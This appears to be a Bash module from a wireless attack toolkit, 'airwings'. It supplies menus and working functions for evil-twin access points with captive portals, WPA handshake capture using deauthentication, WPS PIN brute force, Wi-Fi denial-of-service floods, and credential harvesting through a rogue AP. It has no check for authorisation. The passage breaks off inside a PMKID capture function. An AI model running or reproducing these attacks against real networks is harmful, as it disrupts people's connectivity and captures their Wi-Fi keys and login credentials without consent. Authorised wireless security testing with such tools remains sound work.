#!/bin/bash

# Pentest modules - Evil Twin, handshake capture, password cracking, and advanced attacks

# Airgeddon menu
airgeddon_menu() {
    while true; do
        clear
        echo -e "${BLUE}┌─────────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${BLUE}│${WHITE}                 AIRGEDDON INTEGRATION                   ${BLUE}│${NC}"
        echo -e "${BLUE}├─────────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${BLUE}│ ${CYAN}[1]${WHITE} Launch airgeddon           ${GRAY}Main airgeddon tool${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[2]${WHITE} Quick Evil Twin           ${GRAY}Fast Evil Twin setup${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[3]${WHITE} WPS Attacks              ${GRAY}WPS PIN recovery${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[4]${WHITE} Handshake Capture         ${GRAY}Capture WPA handshakes${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[5]${WHITE} DoS Attacks              ${GRAY}Denial of Service${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[6]${WHITE} Enterprise Attacks       ${GRAY}EAP/Radius attacks${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[7]${WHITE} airgeddon Options         ${GRAY}Configure settings${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[0]${WHITE} Back to Main Menu         ${GRAY}Return${BLUE}│${NC}"
        echo -e "${BLUE}└─────────────────────────────────────────────────────────────────┘${NC}"
        echo ""
        
        read -p "Select an option: " choice
        
        case $choice in
            1) launch_airgeddon ;;
            2) quick_evil_twin ;;
            3) wps_attacks ;;
            4) handshake_capture ;;
            5) dos_attacks ;;
            6) enterprise_attacks ;;
            7) airgeddon_options ;;
            0) break ;;
            *) 
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 2
                ;;
        esac
    done
}

# Launch airgeddon
launch_airgeddon() {
    clear
    echo -e "${BLUE}Launch airgeddon${NC}"
    echo -e "${GRAY}================${NC}"
    
    if ! command -v airgeddon &> /dev/null; then
        echo -e "${RED}[!] airgeddon not found${NC}"
        echo -e "${YELLOW}[!] Install with: git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git${NC}"
        pause
        return
    fi
    
    echo -e "${YELLOW}[*] Starting airgeddon...${NC}"
    echo -e "${YELLOW}[*] Follow on-screen instructions${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to return to airwings${NC}"
    echo ""
    
    # Find airgeddon directory
    local airgeddon_dir=""
    if [[ -d "/root/airgeddon" ]]; then
        airgeddon_dir="/root/airgeddon"
    elif [[ -d "airgeddon" ]]; then
        airgeddon_dir="airgeddon"
    else
        echo -e "${YELLOW}[*] Searching for airgeddon...${NC}"
        airgeddon_dir=$(find /root /home -name "airgeddon.sh" 2>/dev/null | head -1 | sed 's|/airgeddon.sh||')
    fi
    
    if [[ -n "$airgeddon_dir" && -f "$airgeddon_dir/airgeddon.sh" ]]; then
        cd "$airgeddon_dir"
        bash airgeddon.sh
        cd - > /dev/null
    else
        error "airgeddon not found"
    fi
}

# Quick Evil Twin
quick_evil_twin() {
    clear
    echo -e "${BLUE}Quick Evil Twin Attack${NC}"
    echo -e "${GRAY}======================${NC}"

    # Auto-detect available wireless interfaces
    local available_interfaces=$(get_wireless_interfaces)

    if [[ -z "$available_interfaces" ]]; then
        error "No wireless interfaces found"
        pause
        return
    fi

    # Display and select interface
    echo -e "${WHITE}Available wireless interfaces:${NC}"
    local count=0
    local iface_array=()
    for iface in $available_interfaces; do
        count=$((count + 1))
        iface_array+=("$iface")
        local driver=$(ethtool -i "$iface" 2>/dev/null | grep driver | awk '{print $2}' || echo "unknown")
        echo -e "  ${CYAN}[$count]${NC} $iface ${GRAY}(driver: $driver)${NC}"
    done

    echo ""
    if [[ $count -eq 1 ]]; then
        local base_interface="${iface_array[0]}"
        echo -e "${GREEN}[✓] Auto-selected: $base_interface${NC}"
    else
        read -p "Select interface (1-$count) [1]: " selection
        selection="${selection:-1}"

        if [[ ! "$selection" =~ ^[0-9]+$ ]] || [[ $selection -lt 1 ]] || [[ $selection -gt $count ]]; then
            error "Invalid selection"
            pause
            return
        fi

        local base_interface="${iface_array[$((selection - 1))]}"
        echo -e "${GREEN}[✓] Selected: $base_interface${NC}"
    fi

    # Check if monitor mode is already enabled
    local monitor_interface=""
    if is_monitor_mode "$base_interface"; then
        monitor_interface="$base_interface"
        echo -e "${GREEN}[✓] Already in monitor mode${NC}"
    elif is_monitor_mode "${base_interface}mon"; then
        monitor_interface="${base_interface}mon"
        echo -e "${GREEN}[✓] Monitor interface found: $monitor_interface${NC}"
    else
        # Enable monitor mode
        echo -e "${YELLOW}[*] Enabling monitor mode on $base_interface...${NC}"
        airmon-ng check kill &>/dev/null
        sleep 2

        local monitor_output=$(airmon-ng start "$base_interface" 2>&1)

        # Detect monitor interface name from output
        monitor_interface=$(echo "$monitor_output" | grep -oP '\(monitor mode (?:en|vigor)abled on \K\w+(?:\))' | tr -d ')')
        if [[ -z "$monitor_interface" ]]; then
            # Fallback: try common naming pattern
            monitor_interface="${base_interface}mon"
        fi

        sleep 2

        # Verify monitor mode enabled
        if ! is_monitor_mode "$monitor_interface"; then
            error "Failed to enable monitor mode on $base_interface"
            pause
            return
        fi

        echo -e "${GREEN}[✓] Monitor mode enabled: $monitor_interface${NC}"
    fi

    # Get PHY device for creating virtual interface
    local phy=$(iw dev "$monitor_interface" info 2>/dev/null | grep wiphy | awk '{print $2}')

    if [[ -z "$phy" ]]; then
        error "Could not detect PHY device for $monitor_interface"
        pause
        return
    fi

    echo -e "${YELLOW}[*] PHY device: phy$phy${NC}"

    # Create virtual AP interface (dynamic name based on base interface)
    local interface="${base_interface}ap"

    # Remove old virtual interface if it exists
    iw dev "$interface" del 2>/dev/null
    sleep 1

    # Create new virtual interface
    echo -e "${YELLOW}[*] Creating virtual interface $interface...${NC}"
    if ! iw phy"$phy" interface add "$interface" type __ap 2>/dev/null; then
        error "Failed to create virtual interface"
        echo -e "${RED}[!] Your wireless adapter does not support virtual interfaces (VIF)${NC}"
        echo -e "${RED}[!] Evil Twin attacks require an adapter with VIF support${NC}"
        pause

        # Cleanup
        airmon-ng stop "$monitor_interface" &>/dev/null 2>&1
        systemctl start NetworkManager 2>/dev/null
        return
    fi

    # Bring up virtual interface
    sleep 1
    if ! ip link set "$interface" up 2>/dev/null; then
        error "Failed to bring up virtual interface $interface"
        iw dev "$interface" del 2>/dev/null
        airmon-ng stop "$monitor_interface" &>/dev/null 2>&1
        pause
        return
    fi

    echo -e "${GREEN}[✓] Virtual interface created: $interface${NC}"
    sleep 1

    # Check requirements
    if ! is_monitor_mode "$monitor_interface"; then
        echo -e "${RED}[!] Monitor mode not active on $monitor_interface${NC}"
        iw dev "$interface" del 2>/dev/null
        pause
        return
    fi

    if ! check_vif_support "$interface"; then
        warning "Interface $interface may have limited VIF support"
        echo -e "${YELLOW}[*] Attack may still work, continuing...${NC}"
        sleep 2
    fi
    
    # Get target with number selection
    echo -e "${YELLOW}[*] Select target network...${NC}"

    # Run scan and display networks
    quick_scan_with_numbers "$monitor_interface"
    
    echo ""
    read -p "Select network number: " network_choice
    
    # Get scan data from the temporary file created by quick_scan_with_numbers
    local scan_data=""
    local scan_data_file="/tmp/airwings_scan_data.txt"
    if [[ -f "$scan_data_file" ]]; then
        scan_data=$(cat "$scan_data_file")
        rm -f "$scan_data_file"
    fi
    
    # Extract network details from scan data
    local network_info=$(echo "$scan_data" | sed -n "${network_choice}p")
    
    if [[ -z "$network_info" ]]; then
        error "Invalid selection"
        pause
        return
    fi
    
    # Parse the network info (format: "BSSID|Channel|ESSID")
    local target_bssid=$(echo "$network_info" | cut -d'|' -f1 | xargs)
    local target_channel=$(echo "$network_info" | cut -d'|' -f2 | xargs)
    local target_essid=$(echo "$network_info" | cut -d'|' -f3 | xargs)
    
    if ! is_valid_mac "$target_bssid"; then
        error "Invalid BSSID format"
        pause
        return
    fi
    
    if ! is_valid_channel "$target_channel"; then
        error "Invalid channel"
        pause
        return
    fi
    
    if [[ -z "$target_essid" ]]; then
        target_essid="EvilTwin_$(get_timestamp)"
    fi
    
    echo -e "${YELLOW}[*] Starting Evil Twin attack...${NC}"
    echo -e "${YELLOW}[*] Target: $target_essid ($target_bssid)${NC}"
    echo -e "${YELLOW}[*] Channel: $target_channel${NC}"
    
    # Create temporary directory
    local temp_dir=$(create_temp_dir)
    local portal_dir="$temp_dir/portal"
    mkdir -p "$portal_dir"
    
    # Create basic captive portal
    create_basic_portal "$portal_dir" "$target_essid"
    
    # Start Evil Twin attack
    start_evil_twin_attack "$interface" "$monitor_interface" "$target_bssid" "$target_channel" "$target_essid" "$portal_dir"
    
    # Cleanup
    clean_temp_dir "$temp_dir"
    
    pause
}

# WPS attacks
wps_attacks() {
    clear
    echo -e "${BLUE}WPS Attacks${NC}"
    echo -e "${GRAY}============${NC}"
    
    if ! command -v reaver &> /dev/null; then
        echo -e "${RED}[!] Reaver not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install reaver${NC}"
        pause
        return
    fi
    
    local interface=$(get_monitor_interface)

    if [[ -z "$interface" ]]; then
        error "No monitor mode interface found. Please enable monitor mode first."
        pause
        return
    fi
    
    if ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode not enabled${NC}"
        pause
        return
    fi
    
    echo -e "${WHITE}WPS Attack Options:${NC}"
    echo -e "${CYAN}[1]${NC} Scan for WPS networks"
    echo -e "${CYAN}[2]${NC} Pixie Dust attack (fast)"
    echo -e "${CYAN}[3]${NC} Brute force PIN attack"
    echo -e "${CYAN}[4]${NC} PIN attack with custom PIN"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) scan_wps_networks ;;
        2) pixie_dust_attack ;;
        3) brute_force_wps ;;
        4) custom_pin_attack ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Handshake capture
handshake_capture() {
    clear
    echo -e "${BLUE}Handshake Capture${NC}"
    echo -e "${GRAY}=================${NC}"

    # Get monitor interface
    local interface="${MONITOR_INTERFACE}"

    if [[ -z "$interface" ]] || ! is_monitor_mode "$interface"; then
        # Try to find a monitor interface
        interface=$(get_monitor_interfaces | head -1)
    fi

    if [[ -z "$interface" ]]; then
        # Check for common naming pattern
        local base=$(get_first_wireless_interface)
        if [[ -n "$base" ]] && is_monitor_mode "${base}mon"; then
            interface="${base}mon"
        fi
    fi

    if [[ -z "$interface" ]] || ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode not enabled${NC}"
        echo -e "${YELLOW}[!] Please enable monitor mode first${NC}"
        pause
        return
    fi

    echo -e "${GREEN}[✓] Using monitor interface: $interface${NC}"
    echo ""

    # Get target with numbered selection
    echo -e "${YELLOW}[*] Select target network...${NC}"
    quick_scan_with_numbers "$interface"

    echo ""
    read -p "Select network number: " network_choice

    # Get scan data from the temporary file created by quick_scan_with_numbers
    local scan_data=""
    local scan_data_file="/tmp/airwings_scan_data.txt"
    if [[ -f "$scan_data_file" ]]; then
        scan_data=$(cat "$scan_data_file")
        rm -f "$scan_data_file"
    fi

    # Extract network details from scan data
    local network_info=$(echo "$scan_data" | sed -n "${network_choice}p")

    if [[ -z "$network_info" ]]; then
        error "Invalid selection"
        pause
        return
    fi

    # Parse the network info (format: "BSSID|Channel|ESSID")
    local target_bssid=$(echo "$network_info" | cut -d'|' -f1 | xargs)
    local target_channel=$(echo "$network_info" | cut -d'|' -f2 | xargs)
    local target_essid=$(echo "$network_info" | cut -d'|' -f3 | xargs)

    if ! is_valid_mac "$target_bssid"; then
        error "Invalid BSSID format from scan"
        pause
        return
    fi

    if ! is_valid_channel "$target_channel"; then
        error "Invalid channel from scan"
        pause
        return
    fi
    
    echo -e "${YELLOW}[*] Target: $target_essid ($target_bssid)${NC}"
    echo -e "${YELLOW}[*] Channel: $target_channel${NC}"
    echo ""

    # Scan for connected clients
    echo -e "${YELLOW}[*] Scanning for connected clients (15 seconds)...${NC}"
    local client_scan_file=$(mktemp /tmp/client_scan.XXXXXX)

    # Kill any existing airodump processes
    pkill -f airodump-ng 2>/dev/null
    sleep 1

    # Scan for clients on this specific BSSID
    timeout 15 airodump-ng -c "$target_channel" --bssid "$target_bssid" -w "$client_scan_file" --output-format csv "$interface" 2>/dev/null

    # Parse connected clients
    local clients=()
    local client_count=0

    if [[ -f "${client_scan_file}-01.csv" ]]; then
        # Extract station (client) information from CSV
        local in_station_section=0
        while IFS=',' read -r station bssid first last power packets bssid2 probes; do
            # Skip until we find the station section
            if [[ "$station" == "Station MAC" ]]; then
                in_station_section=1
                continue
            fi

            # If we're in station section and have a valid MAC
            if [[ $in_station_section -eq 1 ]]; then
                station=$(echo "$station" | xargs)
                bssid=$(echo "$bssid" | xargs)
                power=$(echo "$power" | xargs)

                # Check if this is a valid client MAC for our target BSSID
                if [[ "$station" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ "$bssid" == "$target_bssid" ]]; then
                    clients+=("$station|$power")
                    client_count=$((client_count + 1))
                fi
            fi
        done < "${client_scan_file}-01.csv"

        rm -f "${client_scan_file}"*.csv "${client_scan_file}"*.kismet* 2>/dev/null
    fi

    # Display found clients
    echo ""
    local target_client=""
    if [[ $client_count -eq 0 ]]; then
        echo -e "${YELLOW}[!] No connected clients detected${NC}"
        echo -e "${YELLOW}[!] Handshake capture will be less effective${NC}"
        echo ""
        read -p "Continue anyway? (y/N): " continue_choice
        if [[ ! "$continue_choice" =~ ^[Yy]$ ]]; then
            return
        fi
    else
        echo -e "${GREEN}[✓] Found $client_count connected client(s):${NC}"
        echo -e "${GRAY}────────────────────────────────────────────${NC}"
        printf "${CYAN}%-5s %-20s %-10s${NC}\n" "#" "Client MAC" "Power"
        echo -e "${GRAY}────────────────────────────────────────────${NC}"

        for i in "${!clients[@]}"; do
            local client_info="${clients[$i]}"
            local client_mac=$(echo "$client_info" | cut -d'|' -f1)
            local client_power=$(echo "$client_info" | cut -d'|' -f2)
            printf "%-5s %-20s %-10s\n" "[$((i+1))]" "$client_mac" "${client_power}dBm"
        done

        echo -e "${GRAY}────────────────────────────────────────────${NC}"
        echo -e "${CYAN}[0]${NC} Deauth all clients (broadcast)"
        echo ""

        read -p "Select client to deauth [0 for all]: " client_choice
        client_choice="${client_choice:-0}"

        if [[ "$client_choice" == "0" ]]; then
            echo -e "${YELLOW}[*] Will deauth all clients (broadcast)${NC}"
        elif [[ $client_choice -ge 1 ]] && [[ $client_choice -le $client_count ]]; then
            local selected_client="${clients[$((client_choice - 1))]}"
            target_client=$(echo "$selected_client" | cut -d'|' -f1)
            echo -e "${GREEN}[✓] Will target client: $target_client${NC}"
        else
            error "Invalid selection"
            return
        fi
    fi

    echo ""
    echo -e "${YELLOW}[*] Starting handshake capture...${NC}"

    local timestamp=$(get_timestamp)
    local capture_file="$LOGS_DIR/captures/handshake_${target_essid// /_}_${timestamp}"
    mkdir -p "$LOGS_DIR/captures"

    # Start capture (launch in tmux/screen/terminal if available)
    local airodump_pid=""
    local hs_session=""

    if command -v tmux >/dev/null 2>&1; then
        hs_session="airwings_hs_${timestamp}"
        tmux new-session -d -s "$hs_session" "airodump-ng -c $target_channel --bssid $target_bssid -w $capture_file $interface"
        echo -e "${YELLOW}[*] Started airodump in tmux session: $hs_session${NC}"
    elif command -v screen >/dev/null 2>&1; then
        hs_session="airwings_hs_${timestamp}"
        screen -dmS "$hs_session" bash -c "airodump-ng -c $target_channel --bssid $target_bssid -w $capture_file $interface"
        echo -e "${YELLOW}[*] Started airodump in screen session: $hs_session${NC}"
    elif type open_in_terminal &>/dev/null; then
        open_in_terminal "airodump-ng -c $target_channel --bssid $target_bssid -w $capture_file $interface"
        sleep 2
        airodump_pid=$(pgrep -f -- "airodump-ng.*${capture_file}" | head -1 || true)
        if [[ -n "$airodump_pid" ]]; then
            echo -e "${YELLOW}[*] Detected airodump PID: $airodump_pid${NC}"
        fi
    else
        airodump-ng -c "$target_channel" --bssid "$target_bssid" -w "$capture_file" "$interface" &
        airodump_pid=$!
    fi

    sleep 10

    # Send targeted deauth packets
    echo -e "${YELLOW}[*] Sending deauth packets...${NC}"
    for i in {1..5}; do
        if [[ -n "$target_client" ]]; then
            echo -e "${CYAN}[*] Targeting client: $target_client${NC}"
            aireplay-ng --deauth 10 -a "$target_bssid" -c "$target_client" "$interface"
        else
            echo -e "${CYAN}[*] Broadcasting deauth to all clients${NC}"
            aireplay-ng --deauth 10 -a "$target_bssid" "$interface"
        fi
        sleep 5
    done
    
    # Stop capture
    if [[ -n "$hs_session" ]]; then
        if command -v tmux >/dev/null 2>&1; then
            tmux kill-session -t "$hs_session" 2>/dev/null || true
            echo -e "${YELLOW}[*] Killed tmux session: $hs_session${NC}"
        elif command -v screen >/dev/null 2>&1; then
            screen -S "$hs_session" -X quit 2>/dev/null || true
            echo -e "${YELLOW}[*] Killed screen session: $hs_session${NC}"
        fi
    elif [[ -n "$airodump_pid" ]]; then
        kill $airodump_pid 2>/dev/null
        wait $airodump_pid 2>/dev/null
    else
        # Fallback: try to pkill by capture filename
        pkill -f "airodump-ng.*${capture_file}" 2>/dev/null || true
    fi
    
    # Verify handshake
    if [[ -f "${capture_file}-01.cap" ]]; then
        echo -e "${YELLOW}[*] Verifying handshake...${NC}"
        local handshake_check=$(aircrack-ng "${capture_file}-01.cap" 2>&1 | grep "1 handshake")
        
        if [[ -n "$handshake_check" ]]; then
            success "Handshake captured successfully!"
            echo -e "Saved to: ${capture_file}-01.cap"
            
            # Clean and save
            wpaclean "${capture_file}-clean.cap" "${capture_file}-01.cap" 2>/dev/null
            success "Cleaned handshake saved to: ${capture_file}-clean.cap"
        else
            warning "Handshake not captured. Try again."
        fi
    else
        error "Capture file not found"
    fi
    
    pause
}

# DoS attacks
dos_attacks() {
    clear
    echo -e "${BLUE}Denial of Service Attacks${NC}"
    echo -e "${GRAY}=============================${NC}"
    
    local interface=$(get_monitor_interface)

    if [[ -z "$interface" ]]; then
        error "No monitor mode interface found. Please enable monitor mode first."
        pause
        return
    fi
    
    if ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode not enabled${NC}"
        pause
        return
    fi
    
    echo -e "${WHITE}DoS Attack Options:${NC}"
    echo -e "${CYAN}[1]${NC} Deauthentication attack"
    echo -e "${CYAN}[2]${NC} Authentication flood"
    echo -e "${CYAN}[3]${NC} AMOK attack (all networks)"
    echo -e "${CYAN}[4]${NC} WIDS confusion"
    echo -e "${CYAN}[5]${NC} Beacon flood"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) deauth_attack ;;
        2) auth_flood ;;
        3) amok_attack ;;
        4) wids_confusion ;;
        5) beacon_flood ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Enterprise attacks
enterprise_attacks() {
    clear
    echo -e "${BLUE}Enterprise Attacks${NC}"
    echo -e "${GRAY}===================${NC}"
    
    if ! command -v bettercap &> /dev/null; then
        echo -e "${RED}[!] bettercap not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install bettercap${NC}"
        pause
        return
    fi
    
    echo -e "${WHITE}Enterprise Attack Options:${NC}"
    echo -e "${CYAN}[1]${NC} EAP sniffing"
    echo -e "${CYAN}[2]${NC} Credential harvesting"
    echo -e "${CYAN}[3]${NC} Rogue RADIUS attack"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) eap_sniffing ;;
        2) credential_harvesting ;;
        3) rogue_radius ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Airgeddon options
airgeddon_options() {
    clear
    echo -e "${BLUE}airgeddon Options${NC}"
    echo -e "${GRAY}==================${NC}"
    
    echo -e "${WHITE}Configuration Options:${NC}"
    echo -e "${CYAN}[1]${NC} Edit .airgeddonrc"
    echo -e "${CYAN}[2]${NC} Update airgeddon"
    echo -e "${CYAN}[3]${NC} Check dependencies"
    echo -e "${CYAN}[4]${NC} Install airgeddon plugins"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) edit_airgeddon_config ;;
        2) update_airgeddon ;;
        3) check_airgeddon_deps ;;
        4) install_airgeddon_plugins ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Helper functions for attacks

# Scan WPS networks
scan_wps_networks() {
    echo -e "${YELLOW}[*] Scanning for WPS networks...${NC}"
    wash -i "$MONITOR_INTERFACE" -C
}

# Pixie Dust attack
pixie_dust_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter target channel: " target_channel
    
    echo -e "${YELLOW}[*] Starting Pixie Dust attack...${NC}"
    reaver -i "$MONITOR_INTERFACE" -b "$target_bssid" -c "$target_channel" -K 1 -vv
}

# Brute force WPS
brute_force_wps() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter target channel: " target_channel
    
    echo -e "${YELLOW}[*] Starting WPS brute force...${NC}"
    reaver -i "$MONITOR_INTERFACE" -b "$target_bssid" -c "$target_channel" -vv
}

# Custom PIN attack
custom_pin_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter target channel: " target_channel
    read -p "Enter WPS PIN (8 digits): " custom_pin
    
    if [[ ! "$custom_pin" =~ ^[0-9]{8}$ ]]; then
        error "Invalid PIN format (must be 8 digits)"
    fi
    
    echo -e "${YELLOW}[*] Testing custom PIN: $custom_pin${NC}"
    reaver -i "$MONITOR_INTERFACE" -b "$target_bssid" -c "$target_channel" -p "$custom_pin" -vv
}

# Deauthentication attack
deauth_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter client MAC (leave empty for all): " client_mac
    read -p "Number of deauth packets [default: 100]: " packet_count
    
    if [[ -z "$packet_count" ]]; then
        packet_count=100
    fi
    
    echo -e "${YELLOW}[*] Sending $packet_count deauth packets...${NC}"
    
    if [[ -n "$client_mac" ]]; then
        aireplay-ng --deauth "$packet_count" -a "$target_bssid" -c "$client_mac" "$MONITOR_INTERFACE"
    else
        aireplay-ng --deauth "$packet_count" -a "$target_bssid" "$MONITOR_INTERFACE"
    fi
}

# Authentication flood
auth_flood() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Number of auth frames [default: 1000]: " frame_count
    
    if [[ -z "$frame_count" ]]; then
        frame_count=1000
    fi
    
    echo -e "${YELLOW}[*] Flooding with $frame_count authentication frames...${NC}"
    aireplay-ng --auth "$frame_count" -a "$target_bssid" -h "$(generate_random_mac)" "$MONITOR_INTERFACE"
}

# AMOK attack
amok_attack() {
    echo -e "${YELLOW}[*] Starting AMOK attack (all networks)...${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
    
    mdk4 "$MONITOR_INTERFACE" amok
}

# WIDS confusion
wids_confusion() {
    echo -e "${YELLOW}[*] Starting WIDS confusion attack...${NC}"
    mdk4 "$MONITOR_INTERFACE" wids
}

# Beacon flood
beacon_flood() {
    read -p "Enter SSID for fake APs: " fake_ssid
    read -p "Number of fake APs [default: 100]: " ap_count
    
    if [[ -z "$fake_ssid" ]]; then
        fake_ssid="FAKE_AP"
    fi
    
    if [[ -z "$ap_count" ]]; then
        ap_count=100
    fi
    
    echo -e "${YELLOW}[*] Starting beacon flood with $ap_count fake APs...${NC}"
    mdk4 "$MONITOR_INTERFACE" beacon -e "$fake_ssid" -c $ap_count
}

# EAP sniffing
eap_sniffing() {
    echo -e "${YELLOW}[*] Starting EAP sniffing...${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
    
    bettercap -iface "$SELECTED_INTERFACE" -eval "set wifi.deauth off; set wifi.ap.ssid fakeap; set wifi.ap.bssid $(generate_random_mac); wifi.recon on; set net.sniff.verbose true; set net.sniff.filter eapol; net.sniff on"
}

# Credential harvesting
credential_harvesting() {
    echo -e "${YELLOW}[*] Starting credential harvesting...${NC}"
    bettercap -iface "$SELECTED_INTERFACE" -eval "wifi.recon on; set wifi.ssid.HARVEST wifi.recon.channel; set wifi.ap.bssid $(generate_random_mac); wifi.ap; set net.sniff.verbose true; set net.sniff.filter port.http; net.sniff on"
}

# Rogue RADIUS
rogue_radius() {
    echo -e "${YELLOW}[*] Starting rogue RADIUS server...${NC}"
    echo -e "${RED}[!] This is advanced - ensure you understand the risks${NC}"
    
    # This would require additional setup
    echo -e "${YELLOW}[!] Rogue RADIUS implementation coming soon${NC}"
    pause
}

# Edit airgeddon config
edit_airgeddon_config() {
    local config_file="$HOME/.airgeddonrc"
    
    if [[ -f "$config_file" ]]; then
        nano "$config_file"
    else
        echo -e "${YELLOW}[!] .airgeddonrc not found${NC}"
        echo -e "${YELLOW}[!] Run airgeddon once to create it${NC}"
    fi
}

# Update airgeddon
update_airgeddon() {
    local airgeddon_dir=""
    if [[ -d "/root/airgeddon" ]]; then
        airgeddon_dir="/root/airgeddon"
    elif [[ -d "airgeddon" ]]; then
        airgeddon_dir="airgeddon"
    fi
    
    if [[ -n "$airgeddon_dir" ]]; then
        echo -e "${YELLOW}[*] Updating airgeddon...${NC}"
        cd "$airgeddon_dir"
        git pull
        cd - > /dev/null
        success "airgeddon updated"
    else
        echo -e "${RED}[!] airgeddon not found${NC}"
    fi
    
    pause
}

# Check airgeddon dependencies
check_airgeddon_deps() {
    echo -e "${YELLOW}[*] Checking airgeddon dependencies...${NC}"
    
    local missing=()
    
    # Check required tools
    for tool in aircrack-ng airmon-ng airodump-ng aireplay-ng mdk4; do
        if ! command -v "$tool" &> /dev/null; then
            missing+=("$tool")
        fi
    done
    
    # Check optional tools
    for tool in reaver bully pixiewps bettercap hashcat; do
        if ! command -v "$tool" &> /dev/null; then
            missing+=("$tool")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}[!] Missing dependencies:${NC}"
        printf '%s\n' "${missing[@]}"
    else
        success "All dependencies installed"
    fi
    
    pause
}

# Install airgeddon plugins
install_airgeddon_plugins() {
    local airgeddon_dir=""
    if [[ -d "/root/airgeddon" ]]; then
        airgeddon_dir="/root/airgeddon"
    elif [[ -d "airgeddon" ]]; then
        airgeddon_dir="airgeddon"
    fi

    if [[ -n "$airgeddon_dir" ]]; then
        echo -e "${YELLOW}[*] Installing airgeddon plugins...${NC}"

        # Download custom portals plugin
        local plugins_dir="$airgeddon_dir/plugins"
        mkdir -p "$plugins_dir"

        # Download useful plugins
        wget -O "$plugins_dir/customportals.sh" https://raw.githubusercontent.com/xpz3/airgeddonplugins/main/customportals.sh 2>/dev/null
        wget -O "$plugins_dir/multint.sh" https://raw.githubusercontent.com/xpz3/airgeddonplugins/main/multint.sh 2>/dev/null

        if [[ -f "$plugins_dir/customportals.sh" ]]; then
            chmod +x "$plugins_dir/customportals.sh"
            success "Custom portals plugin installed"
        fi

        if [[ -f "$plugins_dir/multint.sh" ]]; then
            chmod +x "$plugins_dir/multint.sh"
            success "Multi-interface plugin installed"
        fi
    else
        echo -e "${RED}[!] airgeddon not found${NC}"
    fi

    pause
}

# ══════════════════════════════════════════════════════════════
# Password Menu (Main Menu Option 6)
# ══════════════════════════════════════════════════════════════

password_menu() {
    while true; do
        clear
        echo -e "${BLUE}┌─────────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${BLUE}│${WHITE}               HANDSHAKE & PASSWORD                      ${BLUE}│${NC}"
        echo -e "${BLUE}├─────────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${BLUE}│ ${CYAN}[1]${WHITE} Capture Handshake         ${GRAY}WPA/WPA2 4-way handshake${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[2]${WHITE} Capture PMKID             ${GRAY}Clientless PMKID attack${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[3]${WHITE} Verify Handshake          ${GRAY}Check capture validity${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[4]${WHITE} Crack with Aircrack-ng    ${GRAY}CPU dictionary attack${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[5]${WHITE} Crack with Hashcat        ${GRAY}GPU-accelerated cracking${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[6]${WHITE} Crack with John           ${GRAY}John the Ripper${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[7]${WHITE} Convert Handshake         ${GRAY}cap to hccapx/hc22000${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[8]${WHITE} Manage Wordlists          ${GRAY}View and download lists${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[0]${WHITE} Back to Main Menu         ${GRAY}Return${BLUE}│${NC}"
        echo -e "${BLUE}└─────────────────────────────────────────────────────────────────┘${NC}"
        echo ""

        read -p "Select an option: " choice

        case $choice in
            1) handshake_capture ;;
            2) pmkid_capture ;;
            3) verify_handshake ;;
            4) crack_aircrack ;;
            5) crack_hashcat ;;
            6) crack_john ;;
            7) convert_handshake ;;
            8) manage_wordlists ;;
            0) break ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 2
                ;;
        esac
    done
}

# PMKID capture (clientless attack)
pmkid_capture() {
    clear
    echo -e "${BLUE}PMKID Capture${NC}"
    echo -e "${GRAY}=============${NC}"

    local interface=$(get_monitor_interface)

    if [[ -z "$interface" ]]; then
        error "No monitor mode interface found. Please enable monitor mode first."
        pause
        return
    fi

    if ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode not enabled${NC}"
        pause
        return
    fi

    if ! command -v hcxdumptool &>/dev/null; then
        echo -e "${RED}[!] hcxdumptool not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install hcxdumptool hcxtools${NC}"
